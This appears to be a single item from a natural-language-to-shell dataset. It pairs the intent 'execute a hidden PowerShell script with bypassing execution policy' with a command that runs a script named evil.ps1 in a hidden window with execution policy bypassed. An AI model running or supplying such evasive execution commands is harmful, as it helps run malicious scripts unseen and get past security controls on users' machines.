# Natural language intent:
# Execute a hidden PowerShell script with bypassing execution policy.

powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File (evil.ps1)
